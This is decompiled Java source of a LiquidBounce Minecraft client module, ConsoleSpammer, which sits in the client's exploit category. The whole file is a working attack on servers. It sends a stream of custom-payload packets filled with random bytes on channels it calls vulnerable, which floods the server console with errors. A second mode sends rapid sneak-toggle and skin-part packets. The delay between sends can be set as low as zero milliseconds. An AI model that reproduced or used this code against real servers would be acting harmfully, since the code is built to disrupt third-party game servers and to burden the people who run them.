package net.ccbluex.liquidbounce.features.module.modules.exploit;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import kotlin.Metadata;
import kotlin.TypeCastException;
import kotlin.jvm.internal.Intrinsics;
import kotlin.random.Random;
import net.ccbluex.liquidbounce.api.IClassProvider;
import net.ccbluex.liquidbounce.api.minecraft.client.entity.IEntity;
import net.ccbluex.liquidbounce.api.minecraft.client.entity.IEntityPlayerSP;
import net.ccbluex.liquidbounce.api.minecraft.client.entity.player.WEnumPlayerModelParts;
import net.ccbluex.liquidbounce.api.minecraft.network.IPacket;
import net.ccbluex.liquidbounce.api.minecraft.network.play.client.ICPacketEntityAction;
import net.ccbluex.liquidbounce.api.network.IPacketBuffer;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.UpdateEvent;
import net.ccbluex.liquidbounce.event.WorldEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.MinecraftInstance;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.ccbluex.liquidbounce.value.IntegerValue;
import net.ccbluex.liquidbounce.value.ListValue;
import org.jetbrains.annotations.NotNull;

@ModuleInfo(
    name = "ConsoleSpammer",
    description = "Spams the console of the server with errors.",
    category = ModuleCategory.EXPLOIT
)
@Metadata(
    mv = { 1, 1, 16},
    bv = { 1, 0, 3},
    k = 1,
    d1 = { "\u0000B\n\u0002\u0018\u0002\n\u0002\u0018\u0002\n\u0002\b\u0002\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0010\u0011\n\u0002\u0010\u000e\n\u0002\b\u0002\n\u0002\u0010\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\n\u0002\u0018\u0002\n\u0000\b\u0007\u0018\u00002\u00020\u0001B\u0005¢\u0006\u0002\u0010\u0002J\u0010\u0010\u000f\u001a\u00020\u00102\u0006\u0010\u0011\u001a\u00020\u0012H\u0007J\u0010\u0010\u0013\u001a\u00020\u00102\u0006\u0010\u0011\u001a\u00020\u0014H\u0007R\u000e\u0010\u0003\u001a\u00020\u0004X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0005\u001a\u00020\u0006X\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\u0007\u001a\u00020\bX\u0082\u0004¢\u0006\u0002\n\u0000R\u000e\u0010\t\u001a\u00020\nX\u0082\u0004¢\u0006\u0002\n\u0000R\u0016\u0010\u000b\u001a\b\u0012\u0004\u0012\u00020\r0\fX\u0082\u0004¢\u0006\u0004\n\u0002\u0010\u000e¨\u0006\u0015"},
    d2 = { "Lnet/ccbluex/liquidbounce/features/module/modules/exploit/ConsoleSpammer;", "Lnet/ccbluex/liquidbounce/features/module/Module;", "()V", "delayValue", "Lnet/ccbluex/liquidbounce/value/IntegerValue;", "modeValue", "Lnet/ccbluex/liquidbounce/value/ListValue;", "payload", "Lnet/ccbluex/liquidbounce/api/network/IPacketBuffer;", "timer", "Lnet/ccbluex/liquidbounce/utils/timer/MSTimer;", "vulnerableChannels", "", "", "[Ljava/lang/String;", "onUpdate", "", "event", "Lnet/ccbluex/liquidbounce/event/UpdateEvent;", "onWorld", "Lnet/ccbluex/liquidbounce/event/WorldEvent;", "LiquidBounce"}
)
public final class ConsoleSpammer extends Module {

    private final ListValue modeValue = new ListValue("Mode", new String[] { "Payload", "MineSecure"}, "Payload");
    private final IntegerValue delayValue = new IntegerValue("Delay", 0, 0, 500);
    private final IPacketBuffer payload;
    private final String[] vulnerableChannels;
    private final MSTimer timer;

    @EventTarget
    public final void onUpdate(@NotNull UpdateEvent event) {
        Intrinsics.checkParameterIsNotNull(event, "event");
        if (this.timer.hasTimePassed((long) ((Number) this.delayValue.get()).intValue())) {
            String s = (String) this.modeValue.get();
            boolean player = false;

            if (s == null) {
                throw new TypeCastException("null cannot be cast to non-null type java.lang.String");
            } else {
                String s1 = s.toLowerCase();

                Intrinsics.checkExpressionValueIsNotNull(s1, "(this as java.lang.String).toLowerCase()");
                s = s1;
                switch (s.hashCode()) {
                case -786701938:
                    if (s.equals("payload")) {
                        MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket) MinecraftInstance.classProvider.createCPacketCustomPayload(this.vulnerableChannels[Random.Default.nextInt(this.vulnerableChannels.length)], this.payload));
                    }
                    break;

                case 518567306:
                    if (s.equals("minesecure")) {
                        IEntityPlayerSP ientityplayersp = MinecraftInstance.mc.getThePlayer();

                        if (ientityplayersp == null) {
                            return;
                        }

                        IEntityPlayerSP ientityplayersp1 = ientityplayersp;

                        MinecraftInstance.mc.getGameSettings().setModelPartEnabled(WEnumPlayerModelParts.HAT, Random.Default.nextBoolean());
                        MinecraftInstance.mc.getGameSettings().setModelPartEnabled(WEnumPlayerModelParts.JACKET, Random.Default.nextBoolean());
                        MinecraftInstance.mc.getGameSettings().setModelPartEnabled(WEnumPlayerModelParts.LEFT_PANTS_LEG, Random.Default.nextBoolean());
                        MinecraftInstance.mc.getGameSettings().setModelPartEnabled(WEnumPlayerModelParts.RIGHT_PANTS_LEG, Random.Default.nextBoolean());
                        MinecraftInstance.mc.getGameSettings().setModelPartEnabled(WEnumPlayerModelParts.LEFT_SLEEVE, Random.Default.nextBoolean());
                        MinecraftInstance.mc.getGameSettings().setModelPartEnabled(WEnumPlayerModelParts.RIGHT_SLEEVE, Random.Default.nextBoolean());
                        byte b0 = 5;
                        boolean flag = false;
                        boolean flag1 = false;
                        int i = 0;

                        for (byte b1 = b0; i < b1; ++i) {
                            boolean $i$a$-repeat-ConsoleSpammer$onUpdate$1 = false;

                            MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket) MinecraftInstance.classProvider.createCPacketEntityAction((IEntity) ientityplayersp1, ICPacketEntityAction.WAction.STOP_SNEAKING));
                            MinecraftInstance.mc.getNetHandler().addToSendQueue((IPacket) MinecraftInstance.classProvider.createCPacketEntityAction((IEntity) ientityplayersp1, ICPacketEntityAction.WAction.START_SNEAKING));
                        }
                    }
                }

            }
        }
    }

    @EventTarget
    public final void onWorld(@NotNull WorldEvent event) {
        Intrinsics.checkParameterIsNotNull(event, "event");
        if (event.getWorldClient() == null) {
            this.setState(false);
        }

    }

    public ConsoleSpammer() {
        IClassProvider iclassprovider = MinecraftInstance.classProvider;
        ByteBuf bytebuf = Unpooled.buffer();

        Intrinsics.checkExpressionValueIsNotNull(bytebuf, "Unpooled.buffer()");
        this.payload = iclassprovider.createPacketBuffer(bytebuf);
        this.vulnerableChannels = new String[] { "MC|BEdit", "MC|BSign", "MC|TrSel", "MC|PickItem"};
        this.timer = new MSTimer();
        byte[] rawPayload = new byte[Random.Default.nextInt(128)];

        Random.Default.nextBytes(rawPayload);
        this.payload.writeBytes(rawPayload);
    }
}
